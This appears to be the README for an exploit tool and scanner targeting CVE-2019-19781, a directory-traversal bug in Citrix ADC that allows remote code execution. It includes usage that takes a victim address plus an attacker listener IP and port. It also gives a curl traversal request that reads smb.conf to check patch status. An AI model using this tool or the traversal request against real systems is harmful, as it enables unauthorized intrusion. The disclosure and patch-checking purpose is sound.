# CVE-2019-19781

This was only uploaded due to other researchers publishing their code first. We would have hoped to have had this hidden for awhile longer while defenders had appropriate time to patch their systems.

We are all for responsible disclosure, in this case - the cat was already out of the bag.

Exploits: CVE-2019-19781

Citrixmash v0.1 - Exploits the Citrix Directory Traversal Bug: CVE-2019-19781

INFO: https://www.trustedsec.com/blog/critical-exposure-in-citrix-adc-netscaler-unauthenticated-remote-code-execution/
Forensics and IOCS: https://www.trustedsec.com/blog/netscaler-remote-code-execution-forensics/

This tool exploits a directory traversal bug within Citrix ADC (NetScalers) which calls a perl script that is used
to append files in an XML format to the victim machine. This in turn allows for remote code execution.

Be sure to cleanup these two file locations:
    /var/tmp/netscaler/portal/templates/
    /netscaler/portal/templates/

Note that DNS hostnames and IP addresses are supported in victimaddress and attackerip_listener fields.

Usage:

python citrixmash.py <victimaddress> <victimport> <attackerip_listener> <attacker_port>

usage: citrixmash.py [-h] target targetport attackerip attackerport

## CVE-2019-19781 Scanner

This is a simple test to see if the server is still vulnerable to CVE-2019-19781.

Usage: python3 cve-2019-19781.py <serverip> <serverport>

Note you can use CIDR notations such as 192.168.1.1/24 and hostnames as well.

It will result if the server is still vulnerable or not. You can only do one server at a time.

## Manually Validate Patch

If you want to test to see if this exposure is mitigated use the following:

curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is

Either a 403 means that you are patched or if it returns a Citrix website and NOT the smb.conf file itself.

If you can see smb.conf, then you are vulnerable.

## Installation

To install the requirements, you will need to run the command below. Note that it is important to have version
2.18.4 or greater for python-requests installed in order for the attack and scanner to work successfully.

pip3 install -r requirements.txt
